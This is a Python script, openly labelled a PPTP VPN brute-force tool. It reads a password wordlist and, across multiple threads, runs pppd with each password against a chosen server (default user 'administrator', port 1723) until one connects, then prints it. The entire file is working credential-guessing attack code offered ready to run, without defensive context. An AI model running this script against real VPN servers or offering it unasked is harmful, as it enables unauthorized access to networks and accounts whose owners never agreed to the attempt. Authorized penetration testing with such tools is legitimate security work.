import subprocess
import argparse
from concurrent.futures import ThreadPoolExecutor

def connect_pptp_vpn(server_ip, port, username, password, verbose):
    # Command to use `pppd` with PPTP parameters
    pppd_cmd = [
        "sudo", "-S", "pppd", "plugin", "pptp.so", server_ip,
        "user", username,
        "password", password,
        "refuse-eap", "noauth", "nobsdcomp", "nodeflate", "require-mppe",
        f"pptp_server={server_ip}:{port}"
    ]

    if verbose:
        print(f"[DEBUG] Running command: {' '.join(pppd_cmd)}")

    try:
        if verbose:
            print(f"[DEBUG] Attempting to connect to PPTP server at {server_ip}:{port} with username '{username}' and password '{password}'...")
        result = subprocess.run(
            pppd_cmd, input=password + "\n", text=True, capture_output=True
        )
        if result.returncode == 0:
            print(f"[INFO] Connection successful with password: {password}")
            return password  # Return the successful password
        else:
            if verbose:
                print(f"[DEBUG] Connection failed with password: {password}")
                print(f"[DEBUG] Error output: {result.stderr}")
            return None
    except Exception as e:
        print("[ERROR] An error occurred:", e)
        return None

def try_passwords_from_wordlist(server_ip, port, username, wordlist_file, threads, verbose):
    # Read passwords from the wordlist
    try:
        with open(wordlist_file, 'r') as file:
            passwords = [line.strip() for line in file]
            if verbose:
                print(f"[DEBUG] Loaded {len(passwords)} passwords from '{wordlist_file}'")
    except FileNotFoundError:
        print(f"[ERROR] Wordlist file '{wordlist_file}' not found.")
        return
    except Exception as e:
        print("[ERROR] An error occurred while reading the wordlist:", e)
        return

    # Use ThreadPoolExecutor to attempt connections in parallel
    with ThreadPoolExecutor(max_workers=threads) as executor:
        if verbose:
            print(f"[DEBUG] Starting ThreadPoolExecutor with {threads} threads")
        futures = {
            executor.submit(connect_pptp_vpn, server_ip, port, username, password, verbose): password
            for password in passwords
        }

        for future in futures:
            result = future.result()
            if result:  # If a successful password is found, stop further attempts
                print(f"[INFO] Password found: {result}")
                executor.shutdown(wait=False)  # Stop all other threads
                break
        else:
            print("[INFO] No password in the wordlist succeeded.")

# Parse command-line arguments
parser = argparse.ArgumentParser(description="PPTP VPN Brute-force Tool")
parser.add_argument("server", help="PPTP server IP address")
parser.add_argument("-u", "--user", default="administrator", help="Username for the PPTP server (default: administrator)")
parser.add_argument("-w", "--wordlist", required=True, help="Path to the password wordlist file")
parser.add_argument("-p", "--port", type=int, default=1723, help="PPTP server port (default: 1723)")
parser.add_argument("-t", "--threads", type=int, default=1, help="Number of concurrent threads (default: 1)")
parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose debugging output")

args = parser.parse_args()

# Run the password testing function
try_passwords_from_wordlist(args.server, args.port, args.user, args.wordlist, args.threads, args.verbose)
